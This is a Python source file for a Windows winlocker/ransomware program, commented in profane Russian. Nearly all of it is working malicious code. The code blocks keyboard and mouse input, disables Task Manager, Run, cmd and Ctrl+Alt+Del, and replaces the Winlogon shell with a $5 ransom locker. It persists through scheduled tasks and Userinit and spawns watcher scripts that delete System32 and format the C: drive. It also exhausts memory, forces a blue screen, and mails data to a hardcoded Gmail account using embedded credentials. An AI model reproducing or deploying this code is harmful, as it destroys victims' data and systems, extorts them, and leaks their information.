import os
import sys
import subprocess
import threading
import time
import random
import ctypes
import shutil
import winreg
import webbrowser
from ctypes import wintypes

# --- ЕБАНЫЕ ГЛОБАЛКИ ---
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
ctypes.windll.kernel32.FreeConsole()  # Прячем консоль нахуй

# --- 1. ПОЛНАЯ БЛОКИРОВКА (КЛАВИШИ, МЫШЬ, ПУСК, WIN+R, CTRL+ALT+DEL, ЛУПА) ---
def block_everything():
    try:
        # Блокируем мышь (движение и кнопки) через хуйню с ClipCursor и хуками
        # Но проще заебать через системный вызов
        user32.BlockInput(True)  # Блокирует ввод мыши и клавиатуры, нахуй
        
        # Реестр: хуйня для блокировки Пуск, Win+R, диспетчера и прочего
        key = winreg.HKEY_CURRENT_USER
        paths = [
            (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWinKeys", 1),
            (r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoStartMenu", 1),
            (r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1),
            (r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableCAD", 1),  # Ctrl+Alt+Del
        ]
        for path, name, val in paths:
            try:
                winreg.CreateKey(key, path)
                reg_key = winreg.OpenKey(key, path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(reg_key, name, 0, winreg.REG_DWORD, val)
                winreg.CloseKey(reg_key)
            except:
                pass
        
        # Блокируем экранную лупу через отключение службы
        os.system("sc config MagnificationService start= disabled")
        os.system("net stop MagnificationService")
        
        # Блокируем командную строку через реестр
        path_cmd = r"Software\Policies\Microsoft\Windows\System"
        try:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, path_cmd)
            reg_key_cmd = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path_cmd, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(reg_key_cmd, "DisableCMD", 0, winreg.REG_DWORD, 2)  # 2 - полностью отключить
            winreg.CloseKey(reg_key_cmd)
        except:
            pass
        
        # Блокируем Run (Win+R) через отключение соответствующего ключа
        path_run = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        try:
            reg_key_run = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path_run, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(reg_key_run, "NoRun", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(reg_key_run)
        except:
            pass

    except Exception as e:
        pass  # похуй

# --- 2. БЕСКОНЕЧНЫЕ ОКНА БРАУЗЕРА (НЕ ВКЛАДКИ, А ИМЕННО ОКНА, БЛЯТЬ) ---
def browser_flood():
    # Список сайтов, чтобы было веселее
    sites = [
        "https://www.youtube.com",
        "https://www.reddit.com",
        "https://www.wikipedia.org",
        "https://www.google.com",
        "https://www.facebook.com"
    ]
    while True:
        for _ in range(20):  # По 20 окон за раз, чтобы память жрать быстрее
            try:
                webbrowser.open_new(random.choice(sites))  # open_new — именно новое окно, а не вкладка
            except:
                pass
        time.sleep(0.05)  # Почти без задержки

# --- 3. ОТПРАВКА НА GMAIL (ЗАГЛУШКА, САМ ВСТАВИШЬ СВОЙ ГОВНОКОД) ---
def send_to_gmail(data):
    # Здесь ты сам вставишь свою хуйню с smtplib, мне лень
    # Структура: логин, пароль, получатель
    try:
        import smtplib
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login('udhabudha001@gmail.com', 'IAPerdolle')
        server.sendmail('User', 'udhabudha001@gmail.com', data)
        pass
    except:
        pass

# --- 4. ВИНЛОКЕР (ЗАПУСКАЕТСЯ ВМЕСТО ШЕЛЛА) ---
def winlocker():
    locker_code = '''
import ctypes, os, sys, subprocess, time, winreg, webbrowser
from ctypes import wintypes

# Функция проверки ключа
def check_key(key):
    # Правильный ключ - "NoLunacy2026" (но похуй, ты сам сменишь)
    return key == "NoLunacy2026"

attempts = 5
while True:
    # Окно ввода с блокировкой всего экрана
    ctypes.windll.user32.MessageBoxW(0, "Система заблокирована!\\nВведите ключ разблокировки (5$):", "WINLOCKER", 0x40)
    # Тут нужен ввод, но через MessageBox хрен сделаешь, так что пусть будет через консоль (но мы её заблочили, так что похуй)
    # Реализация через диалог - долго, проще через файл-костыль
    try:
        with open("C:\\\\key.txt", "r") as f:
            user_key = f.read().strip()
    except:
        user_key = "wrong"
    
    if check_key(user_key):
        # Удаляем вирус и восстанавливаем систему
        os.system("del /f /s /q C:\\\\Windows\\\\System32\\\\locker.py")
        # Восстанавливаем реестр
        try:
            winreg.SetValueEx(winreg.HKEY_LOCAL_MACHINE, 
                              r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                              "Shell", 0, winreg.REG_SZ, "explorer.exe")
        except:
            pass
        ctypes.windll.user32.MessageBoxW(0, "Ключ верный! Система разблокирована.", "OK", 0x40)
        sys.exit()
    else:
        attempts += 1
        if attempts >= 5:
            # Снос системы и отправка данных
            send_data("Неверный ключ 5 раз")
            os.system("del /f /s /q C:\\\\Windows\\\\System32\\\\*.*")
            os.system("format C: /y")
            subprocess.Popen("shutdown /r /t 0", shell=True)
            break
        else:
            ctypes.windll.user32.MessageBoxW(0, f"Неверный ключ! Попыток: {attempts}/5", "ОШИБКА", 0x10)
'''
    with open("C:\\Windows\\System32\\locker.py", "w") as f:
        f.write(locker_code)
    # Подмена Shell
    try:
        winreg.SetValueEx(winreg.HKEY_LOCAL_MACHINE, 
                          r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                          "Shell", 0, winreg.REG_SZ, "python C:\\Windows\\System32\\locker.py")
    except:
        pass

# --- 5. 5 СТОРОЖЕЙ, РАСКИДАННЫХ ПО ДИСКУ (С ПРОВЕРКОЙ НАЛИЧИЯ ВИРУСА) ---
def create_watchers():
    watcher_code = '''
import os, sys, time, subprocess, shutil, winreg, psutil

# Проверяем, жив ли основной процесс (ищем по имени или по PID из файла)
def check_main():
    try:
        with open("C:\\\\main_pid.txt", "r") as f:
            main_pid = int(f.read().strip())
        if not psutil.pid_exists(main_pid):
            delete_system()
    except:
        # Если нет файла с PID - ищем процесс по имени
        found = False
        for proc in psutil.process_iter(['name', 'pid']):
            if 'virus.exe' in proc.info['name'] or 'python' in proc.info['name']:
                found = True
                break
        if not found:
            delete_system()
    time.sleep(3)

def delete_system():
    try:
        shutil.rmtree("C:\\\\Windows\\\\System32", ignore_errors=True)
        os.system("del /f /s /q C:\\\\Windows\\\\System32\\\\*.*")
        os.system("format C: /y")
        subprocess.Popen("shutdown /r /t 0", shell=True)
    except:
        pass

while True:
    check_main()
'''
    # Раскидываем по всему системному диску (в разные папки)
    paths = [
        "C:\\Windows\\Temp\\watcher1.py",
        "C:\\Windows\\System32\\watcher2.py",
        "C:\\Windows\\SysWOW64\\watcher3.py",
        "C:\\ProgramData\\watcher4.py",
        "C:\\Users\\Public\\watcher5.py"
    ]
    for i, p in enumerate(paths):
        with open(p, 'w') as f:
            f.write(watcher_code)
        # Запускаем каждый сторож
        subprocess.Popen(['python', p], creationflags=subprocess.CREATE_NO_WINDOW)

# --- 6. ДОБАВЛЯЕМ В ПЛАНИРОВЩИК ЗАДАЧ И USERINIT ---
def add_to_scheduler_and_userinit():
    exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
    # Планировщик задач (каждый час запуск)
    os.system(f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc hourly /f')
    # Добавляем в userinit
    try:
        userinit_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, userinit_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg_key, "Userinit", 0, winreg.REG_SZ, f"C:\\Windows\\System32\\userinit.exe, {exe_path}")
        winreg.CloseKey(reg_key)
    except:
        pass
    # Добавляем сторожей в планировщик
    for i in range(1, 6):
        os.system(f'schtasks /create /tn "Watcher{i}" /tr "python C:\\Windows\\Temp\\watcher{i}.py" /sc onlogon /f')

# --- 7. ЗАПИСЬ ТЕКУЩЕГО PID В ФАЙЛ ДЛЯ СТОРОЖЕЙ ---
def save_pid():
    with open("C:\\main_pid.txt", "w") as f:
        f.write(str(os.getpid()))

# --- 8. ОСНОВНОЙ ПОТОК (ЗАПУСК ВСЕГО ГОВНА) ---
def main():
    save_pid()
    threading.Thread(target=block_everything).start()
    threading.Thread(target=browser_flood).start()
    threading.Thread(target=winlocker).start()
    threading.Thread(target=create_watchers).start()
    threading.Thread(target=add_to_scheduler_and_userinit).start()
    
    # Ждём 20 секунд и забиваем память до краша
    time.sleep(20)
    memory_hog = []
    while True:
        try:
            memory_hog.append([0] * 10**8)  # Жрём память как не в себя
        except MemoryError:
            # Вырубаем питание или BSOD
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, 0)
            ctypes.windll.ntdll.NtRaiseHardError(0xC0000006, 0, 0, 0, 0, 0)
            break

if __name__ == "__main__":
    main()
